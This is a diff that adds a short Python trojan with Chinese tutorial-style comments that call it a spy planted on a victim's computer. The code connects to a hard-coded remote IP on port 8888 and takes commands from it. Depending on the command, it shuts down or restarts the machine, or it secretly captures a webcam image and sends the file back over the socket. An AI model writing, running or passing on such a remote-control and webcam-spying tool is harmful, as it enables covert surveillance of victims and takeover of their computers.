@@ -1,0 +1,47 @@
+# 木马  夹带私货
+from socket import*  # 导入网络编程的模块
+import os            # 导入电脑操作系统模块
+import cv2           # 导入视觉图像处理模块
+
+s = socket()                           # 1.准备一个套接字
+s.connect(('117.159.10.60', 8888))    # 2.套接字S申请连接后台的号码
+'''
+117.159.17.219；117.159.10.60
+# 本机测试：木马使用本机回环地址127.0.0.1；后台使用0.0.0.0
+# 网络环境：服务器的IP地址
+'''
+
+# 安插在受害者电脑上的间谍
+choice = s.recv(1024).decode()
+# 一次性最多接受1024个字节 decode()解码
+if choice == '1':
+    os.system('shutdown -s -t 60')  # 关机-s  -t时间/s
+elif choice == ' 2':
+    os.system('shutdown -r -t 60')  # 重启-r
+    # 取消关机 win+r 输入shutdown -a
+elif choice == '3':
+    cap = cv2.VideoCapture(0)   # 1.打开摄像头 0-默认摄像头
+    ret, frame = cap.read()     # 2.读取一帧图像 0帧起手
+    ret, frame = cap.read()     # 2.读取一帧图像
+    cv2.imwrite('1.png', frame) # 3.保存在电脑上
+    cap.release()               # 4.关闭摄像头
+
+    # 5.把文件发送给后台
+    # (1.把文件大小算出来 发送给后台 等待后头回复确定
+    file_size = os.path.getsize('1.png')
+    s.send(str(file_size).encode())
+    s.recv(1024).decode()
+    # (2.把文件打开 一点一点读取出来 发送过去
+    with open('1.png', 'rb') as file:
+        for data in file:
+            s.send(data)
+
+    # opencv-python 图像视觉处理
+    #2使用工具
+    #同不同意, 老婆 = 钻戒.求婚()
+    #解决方案
+
+# 总结一下
+# s.send('字符串'.encode())
+# s.send(str(数字).encode())
+# s.send(二进制数字)
